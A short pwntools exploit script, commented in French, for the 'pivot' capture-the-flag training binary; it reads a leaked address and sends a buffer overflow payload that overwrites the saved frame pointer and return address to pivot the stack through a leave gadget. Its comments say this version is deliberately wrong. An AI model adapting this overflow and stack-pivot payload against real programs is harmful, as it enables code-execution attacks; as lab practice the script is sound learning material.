#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version avec erreur sur l'usage de leave
# on oublie d'enlever - 8 a la valeur qui ecrase SRBP

# break at the end of pwnme
gs='''
b *pwnme+180
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf

useless_func=elf.symbols['uselessFunction']
pwnme=elf.symbols['pwnme']
g_leave = pwnme+181



io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

# Message 1
PL=p64(useless_func)
io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL =b"A"*offset
PL+=p64(leak)
PL+=p64(g_leave)
io.sendlineafter(b"> ",PL)

io.interactive()

